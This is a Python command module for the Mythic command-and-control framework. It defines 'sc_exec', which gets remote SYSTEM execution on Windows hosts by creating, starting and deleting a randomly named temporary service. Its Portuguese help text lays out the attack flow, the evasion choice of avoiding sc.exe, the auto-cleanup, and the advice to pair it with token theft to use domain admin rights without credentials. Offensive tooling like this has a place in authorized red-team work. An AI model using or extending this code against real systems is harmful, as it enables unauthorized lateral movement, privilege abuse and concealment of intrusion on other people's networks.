from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class ScExecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=True)],
                description="IP ou hostname do alvo (ex: 10.12.193.4)",
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=True)],
                description=(
                    "Comando a executar como SYSTEM no host remoto. "
                    "Redirecione stdout para capturar output: "
                    "'whoami > C:\\Windows\\Temp\\o.txt 2>&1'"
                ),
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "Credencial explícita para OpenSCManager (DOMAIN\\user). "
                    "Vazio = usa token do thread atual (token_steal)."
                ),
                default_value="",
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Senha. Vazio = usa token atual.",
                default_value="",
            ),
            CommandParameter(
                name="svc_name",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "Nome do serviço temporário. Vazio = gerado aleatoriamente (8 chars hex). "
                    "O serviço é deletado após execução."
                ),
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                d = json.loads(self.command_line)
                self.add_arg("target",   d.get("target", ""))
                self.add_arg("command",  d.get("command", ""))
                self.add_arg("username", d.get("username", ""))
                self.add_arg("password", d.get("password", ""))
                self.add_arg("svc_name", d.get("svc_name", ""))
            else:
                parts = self.command_line.strip().split(" ", 1)
                self.add_arg("target",   parts[0] if parts else "")
                self.add_arg("command",  parts[1] if len(parts) > 1 else "")
                self.add_arg("username", "")
                self.add_arg("password", "")
                self.add_arg("svc_name", "")
        else:
            for k in ("target", "command", "username", "password", "svc_name"):
                self.add_arg(k, "")


class ScExecCommand(CommandBase):
    cmd         = "sc_exec"
    needs_admin = False
    help_cmd    = "sc_exec <target> <command>"
    description = (
        "Execução remota como SYSTEM via Service Control Manager (T1021.002).\n"
        "Usa OpenSCManagerW + CreateServiceW + StartServiceW + DeleteService — "
        "sem sc.exe.\n\n"
        "Fluxo:\n"
        "  1. OpenSCManagerW(\\\\target) com token atual ou LogonUser explícito\n"
        "  2. CreateServiceW (nome randômico, binpath=cmd.exe /c <command>)\n"
        "  3. StartServiceW → executa como SYSTEM no host remoto\n"
        "  4. DeleteService após 3s (auto-cleanup)\n\n"
        "Requer privilégio de admin local no alvo (para abrir SCM remotamente).\n"
        "Combine com token_steal para usar token de domain admin sem credenciais."
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1021.002", "T1543.003"]
    supported_ui_features = []
    argument_class        = ScExecArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        target   = task.args.get_arg("target")   or ""
        command  = task.args.get_arg("command")  or ""
        username = task.args.get_arg("username") or ""

        if username:
            task.display_params = "target={} user={} cmd='{}'".format(
                target, username, command)
        else:
            task.display_params = "target={} cmd='{}' [token atual → SYSTEM]".format(
                target, command)
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
